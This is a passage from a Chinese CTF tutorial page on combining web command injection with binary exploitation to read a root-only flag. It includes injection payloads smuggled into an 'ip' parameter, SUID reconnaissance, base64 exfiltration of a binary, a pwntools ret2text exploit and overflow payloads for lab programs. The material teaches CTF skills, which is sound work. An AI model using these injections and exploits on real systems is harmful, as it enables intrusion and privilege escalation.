+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># 查看本机监听端口，找内部服务</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="nv">ip</span><span class="o">=</span><span class="m">127</span>.0.0.1<span class="p">;</span>ss<span class="w"> </span>-tlnp
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="c1"># 查找 SUID 程序</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="nv">ip</span><span class="o">=</span><span class="m">127</span>.0.0.1<span class="p">;</span>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="c1"># 确认 flag 权限</span>
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="nv">ip</span><span class="o">=</span><span class="m">127</span>.0.0.1<span class="p">;</span>ls<span class="w"> </span>-l<span class="w"> </span>/flag
+</code></pre></div>
+<p>发现 <code>/usr/local/bin/readflag</code> 带 SUID 位且属于 root：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>-rwsr-xr-x 1 root root 16632 Jun  1 10:00 /usr/local/bin/readflag
+</code></pre></div>
+<h3 id="_10">第三步：下载二进制到本地分析<a class="headerlink" href="#_10" title="Permanent link">¶</a></h3>
+<p>用命令注入把文件传出来（例如 base64 编码后回显）：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>curl<span class="w"> </span><span class="s1">'http://target/ping.php?ip=127.0.0.1;base64 /usr/local/bin/readflag'</span><span class="w"> </span>-o<span class="w"> </span>leak.html
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="c1"># 从返回中提取 base64 内容并解码</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>base64<span class="w"> </span>-d<span class="w"> </span>leak.b64<span class="w"> </span>&gt;<span class="w"> </span>readflag
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>chmod<span class="w"> </span>+x<span class="w"> </span>readflag
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>checksec<span class="w"> </span>--file<span class="o">=</span>readflag
+</code></pre></div>
+<p>本地反汇编（<code>objdump -d</code>、Ghidra 或 IDA）发现 <code>main</code> 函数里：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="kt">void</span><span class="w"> </span><span class="nf">vuln</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">"input:"</span><span class="p">);</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="w">    </span><span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span><span class="w">            </span><span class="c1">// 栈溢出，无长度检查</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">check_token</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">  </span><span class="c1">// 需要绕过或直接覆盖返回地址</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">"cat /flag"</span><span class="p">);</span>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="p">}</span>
+</code></pre></div>
+<p>程序里本身有 <code>system("cat /flag")</code> 的逻辑，但被一个永远失败的检查挡住。思路：利用 <code>gets</code> 溢出覆盖返回地址，直接跳到 <code>system("cat /flag")</code> 的地址。No PIE，地址固定，不需要泄漏。</p>
+<h3 id="exploit">第四步：本地写好 exploit，再回传执行<a class="headerlink" href="#exploit" title="Permanent link">¶</a></h3>
+<p>本地用 pwntools 写好 exp 并验证：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./readflag'</span><span class="p">)</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="c1"># 通过调试确定偏移：buf 到返回地址 64+8=72 字节</span>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="n">offset</span> <span class="o">=</span> <span class="mi">72</span>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="n">cat_flag_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'call_flag'</span><span class="p">]</span>  <span class="c1"># 假设存在该函数，或直接填 system("cat /flag") 的地址</span>
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./readflag'</span><span class="p">)</span>
+<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">'input:'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'A'</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">cat_flag_addr</span><span class="p">))</span>
+<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>本地能弹出 flag 后，把 exp 改造成在目标容器内执行。简单题目中可以直接在命令注入里一行搞定：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># 用 python 在目标上直接生成 payload 并管道喂给程序</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nv">ip</span><span class="o">=</span><span class="m">127</span>.0.0.1<span class="p">;</span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">"print('A'*72 + '\x40\x12\x36\x40\x00\x00\x00\x00')"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>/usr/local/bin/readflag
+</code></pre></div>
+<p>注意字节序：x86-64 小端序，地址 <code>0x40123640</code> 这类值要按小端写入，且 payload 中不能包含会被 shell 或 PHP 过滤的字符——必要时用 <code>python3 -c</code> 生成或 base64 解码：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nv">ip</span><span class="o">=</span><span class="m">127</span>.0.0.1<span class="p">;</span><span class="nb">echo</span><span class="w"> </span><span class="s1">'QUFB...'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="p">|</span><span class="w"> </span>/usr/local/bin/readflag
+</code></pre></div>
+<h3 id="_11">链路总结<a class="headerlink" href="#_11" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>命令注入 (Web) → www-data 立足点 → 侦察发现 SUID 程序
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>    → 下载分析 → 本地编写/调通 exploit → 通过 Web 通道投递执行 → flag
+</code></pre></div>
+<p>这套链路的每一环单独看都不难，难在把各环节的信息串起来。实战中常见的变体还有：立足点后攻击监听在 <code>127.0.0.1</code> 的内部 TCP 服务（用 <code>curl</code>/<code>nc</code> 或端口转发把服务暴露出来再打）、利用内核版本漏洞提权（<code>uname -a</code> 查版本后找对应 exp）等。</p>
+<h2 id="pwn">需要前置的 Pwn 基础<a class="headerlink" href="#pwn" title="Permanent link">¶</a></h2>
+<p>本章只讲「Web 与二进制如何衔接」，不展开二进制利用本身的技术细节。如果你在组合拳的第三步、第四步感到吃力，需要补的前置知识在本书 Pwn 部分：</p>
+<ul>
+<li><strong>栈溢出与返回地址覆盖</strong>：ret2text、ret2libc 的基本原理；</li>
+<li><strong>保护机制</strong>：Canary、NX、PIE、RELRO 的含义与绕过思路；</li>
+<li><strong>工具链</strong>：pwntools 的基本用法（<code>ELF</code>、<code>process</code>、<code>remote</code>、<code>p64/u64</code>）、GDB 调试；</li>
+<li><strong>格式化字符串与堆利用</strong>：遇到更复杂的内部服务时需要。</li>
+</ul>
+<p>「够用即止」的标准：能看懂 <code>checksec</code> 输出、能算出溢出偏移、能写出一个 ret2text 的 exp，就足以应付大多数入门级的 Web+Pwn 综合题。更深入的内容请前往本书 Pwn 章节系统学习。</p>
+<h2 id="_12">例题推演<a class="headerlink" href="#_12" title="Permanent link">¶</a></h2>
+<p>下面以一道典型的入门综合题为例（模拟题，架构取自真实比赛常见模式），演示完整解题过程。</p>
+<h3 id="_13">题目描述<a class="headerlink" href="#_13" title="Permanent link">¶</a></h3>
+<blockquote>
+<p>某站点是一个 Flask 写的「命令执行面板」，提示「flag 在 root 手里」。开放端口 80。</p>
+</blockquote>
+<h3 id="_14">解题过程<a class="headerlink" href="#_14" title="Permanent link">¶</a></h3>
+<p><strong>1. 信息收集</strong></p>
+<p>访问站点，页面提供一个「执行系统命令」的输入框，输入 <code>id</code> 返回 <code>uid=33(www-data)</code>。典型的直接命令执行，没有任何过滤。</p>
+<p>先看一圈环境：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># 通过页面的命令执行框依次提交</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>ls<span class="w"> </span>-l<span class="w"> </span>/
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>cat<span class="w"> </span>/flag
+</code></pre></div>
+<p><code>cat /flag</code> 返回 <code>Permission denied</code>，<code>ls -l /</code> 显示：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>-r-------- 1 root root   38 Jun  1 09:00 flag
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>-rwsr-x--- 1 root www-data 17K Jun  1 09:00 getflag
+</code></pre></div>
+<p>关键点：<code>getflag</code> 是 SUID 程序，属主 root，且属组 <code>www-data</code> 可执行——也就是说我们当前的 <code>www-data</code> 身份恰好有权运行它，运行时会以 root 身份执行。</p>
+<p><strong>2. 分析 getflag</strong></p>
+<p>把程序拉回来：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># 在命令执行框中</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>base64<span class="w"> </span>/getflag
+</code></pre></div>
+<p>解码后 <code>checksec</code>：No PIE、NX enabled、无 Canary。<code>objdump -d getflag</code> 看到逻辑：</p>
+<ul>
+<li>程序从 <code>argv[1]</code> 读入一个「口令」；</li>
+<li>口令与硬编码字符串比较，相等则 <code>system("cat /flag")</code>；</li>
+<li>比较函数是自己写的 <code>check()</code>，内部用 <code>strcpy</code> 把 <code>argv[1]</code> 拷到 32 字节栈缓冲区——存在栈溢出。</li>
+</ul>
+<p><strong>3. 选择攻击路径</strong></p>
+<p>有两条路：</p>
+<ul>
+<li>路径 A：逆向出硬编码口令，直接作为参数传入。<code>strings getflag</code> 或看反汇编里 <code>strcmp</code> 附近的常量，发现口令是 <code>s3cret_token</code>，直接 <code>/getflag s3cret_token</code> 即可。</li>
+<li>路径 B：假设口令被混淆处理，利用 <code>strcpy</code> 溢出覆盖返回地址跳到 <code>system("cat /flag")</code> 处。</li>
+</ul>
+<p>本题路径 A 直接成功。在命令执行框提交：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>/getflag<span class="w"> </span>s3cret_token
+</code></pre></div>
+<p>页面返回 flag。</p>
+<p><strong>4. 如果口令不可得（路径 B 演示）</strong></p>
+<p>偏移计算：<code>check()</code> 中缓冲区 32 字节 + 保存的 rbp 8 字节 = 40 字节覆盖返回地址。通过 <code>objdump</code> 找到 <code>system("cat /flag")</code> 所在代码块地址 <code>0x4011f6</code>。由于参数经过 Web 传递、可能吞掉特殊字符，用 Python 在目标上生成：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">"import subprocess; subprocess.run(['/getflag', b'A'*40 + b'\xf6\x11\x40\x00\x00\x00\x00\x00'])"</span>
+</code></pre></div>
+<p><strong>5. 复盘</strong></p>
+<p>本题的链路是：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>Web 命令执行（无过滤）→ www-data
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>    → 侦察发现 SUID + 属组可执行的 getflag
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>    → 下载逆向（strings / objdump）
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>    → 口令比较 or 栈溢出 → root 权限 cat flag
+</code></pre></div>
+<p>值得记住的两点经验：</p>
+<ul>
+<li>SUID 程序的属组权限经常是出题人留的「刚刚好」的口子：<code>rwsr-x---</code> 且属组为 <code>www-data</code>，明示了从 Web 打过来的预期路径；</li>
+<li>能逆向出逻辑就别写溢出——Web 通道传二进制 payload 容易踩字符过滤的坑，简单路径优先。</li>
+</ul>
+<h2 id="_15">小结<a class="headerlink" href="#_15" title="Permanent link">¶</a></h2>
+<ul>
+<li>Web+Pwn 题的核心是链路：Web 漏洞负责入场，二进制利用负责拿 flag；</li>
+<li>Web 层收集的版本、配置、凭据信息，直接决定二进制攻击的方案；</li>
+<li>典型组合拳：RCE 立足 → 侦察（SUID / 内部端口 / 内核版本）→ 下载分析 → 本地调通 exp → 回传执行；</li>
+<li>二进制利用本身的技术请前往本书 Pwn 部分学习，入门题够用即止。</li>
+</ul></div>
+
+<!-- Source file information -->
+
+
+<!-- Was this page helpful? -->
+
+  
+
+
+
+
+<!-- Previous and next pages link -->
+<nav
+class="md-footer__inner md-grid"
+aria-label="页脚"
+
+>
+
+<!-- Link to previous page -->
+
+  
+  <a
+    href="../awd/"
+    class="md-footer__link md-footer__link--prev"
+    aria-label="上一页: AWD模式"
+    rel="prev"
+  >
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+    </div>
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        上一页
+      </span>
+      <div class="md-ellipsis">
+        AWD模式
+      </div>
+    </div>
+  </a>
+
+
+<!-- Link to next page -->
+
+  
+  <a
+    href="../nday/"
+    class="md-footer__link md-footer__link--next"
+    aria-label="下一页: Nday利用"
+    rel="next"
+  >
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        下一页
+      </span>
+      <div class="md-ellipsis">
+        Nday利用
+      </div>
+    </div>
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+    </div>
+  </a>
+
+</nav>
+
+<!-- Comment system -->
+
+  <h2 id="__comments">评论</h2>
+
+  <!-- giscus：主题与外壳 hc-theme 同步（初始 + 切换时 postMessage） -->
+  <script src="https://giscus.app/client.js"
+    data-repo="ProbiusOfficial/Hello-CTF"
+    data-repo-id="R_kgDOJXX6hg"
+    data-category="Show and tell"
+    data-category-id="DIC_kwDOJXX6hs4CXmuV"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="light"
+    data-lang="zh-CN"
+    crossorigin="anonymous"
+    async>
+  </script>
+  <script>
+    (function () {
+      var script = document.querySelector("script[src*=giscus]");
+      function currentTheme() {
+        var t = null;
+        try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+        return t === "dark" ? "dark" : "light";
+      }
+      /* 初始主题：giscus 加载前写入 data-theme */
+      script.setAttribute("data-theme", currentTheme());
+      /* 外壳主题切换 → 通知 giscus iframe 换肤（由 shell.js 广播 hc-theme-change） */
+      document.addEventListener("hc-theme-change", function (e) {
+        var theme = e.detail === "dark" ? "dark" : "light";
+        var iframe = document.querySelector("iframe.giscus-frame");
+        if (iframe) {
+          iframe.contentWindow.postMessage(
+            { giscus: { setConfig: { theme: theme } } },
+            "https://giscus.app"
+          );
+        }
+      });
+    })();
+  </script>
+
+  <!-- 评论区显示优化 -->
+  <style>
+    #__comments {
+      margin-top: 2.2rem;
+      padding-top: 1.2rem;
+      border-top: 1px solid var(--line, #e6eaf1);
+      font-size: 1rem;
+    }
+    .giscus, .giscus-frame { width: 100%; }
+    .giscus-frame { border: none; color-scheme: light; }
+    [data-md-color-scheme="slate"] .giscus-frame { color-scheme: dark; }
+  </style>
+
+
+<!-- 才懒得给你加空格呢 给你塞个 Pangu.js 哼！ -->
+<head>
+  <script src="https://cdn.jsdelivr.net/npm/pangu.simple@1.0.5/dist/browser/pangu.js"></script>
+  <script>
+    pangu.spacingPage();
+  </script>
+</head>
+      </article>
+      
+        <aside class="hc-toc">
+          <div class="hc-toc-cap">ON THIS PAGE</div>
+          
+  <ul>
+    
+      <li>
+        <a href="#web">Web与二进制结合</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_1">这类题的常见形态</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#web_1">形态一：Web 入口 → 内部服务是二进制组件</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_2">形态二：需要服务漏洞利用</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_3">形态三：需要提权打通链路</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#web_2">信息衔接：Web 层的信息如何指导二进制利用</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_4">版本信息</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_5">配置信息</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_6">凭据与密钥</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_7">一条原则</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#web-flag">常见组合拳示例：从 Web 立足点到拿下 flag</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_8">场景设定</a>
+        
+      </li>
+    
+      <li>
+        <a href="#web_3">第一步：Web 层拿到命令执行</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_9">第二步：侦察容器内部</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_10">第三步：下载二进制到本地分析</a>
+        
+      </li>
+    
+      <li>
+        <a href="#exploit">第四步：本地写好 exploit，再回传执行</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_11">链路总结</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#pwn">需要前置的 Pwn 基础</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_12">例题推演</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_13">题目描述</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_14">解题过程</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#_15">小结</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+  </ul>
+
+        </aside>
+      
+    </div>
+    <footer class="hc-footer">
+      <span>© 2026 探姬 · Hello CTF</span>
+      <span class="links">
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF/pulls" target="_blank" rel="noopener">参与共建</a>
+        <a href="../../sidebar/feedback.html">反馈与群聊</a>
+      </span>
+    </footer>
+  </div>
+
+  <!-- 站点原有 extra_javascript（baidu_SEO / katex / statis / FullCalendar 等） -->
+  
+    <script src="../../javascripts/baidu_SEO.js"></script>
+  
+    <script src="../../javascripts/katex.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js"></script>
+  
+    <script src="../../javascripts/statis.js"></script>
+  
+    <script src="../../javascripts/FullCalendar.js"></script>
+  
+    <script src="../../shell/feedback-widget.js"></script>
+  
+
+  <!-- mermaid（material bundle 移除后自行加载） -->
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      if (!window.mermaid) return;
+      document.querySelectorAll("pre.mermaid").forEach(function (el) {
+        var div = document.createElement("div");
+        div.className = "mermaid";
+        div.textContent = el.textContent;
+        el.replaceWith(div);
+      });
+      try {
+        mermaid.initialize({ startOnLoad: false, theme: "neutral" });
+        mermaid.run({ querySelector: ".mermaid" });
+      } catch (e) {}
+    });
+  </script>
+
+  <!-- 代码复制按钮（material bundle 移除后自实现） -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".md-typeset pre").forEach(function (pre) {
+        if (pre.querySelector(".hc-copy") || pre.classList.contains("mermaid")) return;
+        var btn = document.createElement("button");
+        btn.className = "hc-copy";
+        btn.textContent = "复制";
+        btn.onclick = function () {
+          var text = pre.innerText.replace(/^复制\n/, "");
+          navigator.clipboard.writeText(text).then(function () {
+            btn.textContent = "已复制";
+            setTimeout(function () { btn.textContent = "复制"; }, 1500);
+          });
+        };
+        pre.appendChild(btn);
+      });
+    });
+  </script>
+
+  <!-- TOC 滚动高亮 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var links = Array.from(document.querySelectorAll(".hc-toc a"));
+      if (!links.length) return;
+      var map = links.map(function (a) {
+        var el = document.getElementById(decodeURIComponent(a.getAttribute("href").slice(1)));
+        return el ? { a: a, el: el } : null;
+      }).filter(Boolean);
+      function spy() {
+        var current = null;
+        map.forEach(function (m) { if (m.el.getBoundingClientRect().top <= 80) current = m; });
+        links.forEach(function (a) { a.classList.remove("on"); });
+        if (current) current.a.classList.add("on");
+      }
+      document.addEventListener("scroll", spy, { passive: true });
+      spy();
+    });
+  </script>
+
+  <!-- 顶部导航下拉：fixed 定位避开 overflow 裁剪 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".tn-item").forEach(function (item) {
+        var drop = item.querySelector(".tn-drop");
+        if (!drop) return;
+        item.addEventListener("mouseenter", function () {
+          var r = item.getBoundingClientRect();
+          drop.style.top = r.bottom + "px";
+          var left = Math.min(r.left, window.innerWidth - 240);
+          drop.style.left = Math.max(10, left) + "px";
+        });
+      });
+    });
+  </script>
+
+  
+</body>
+</html>
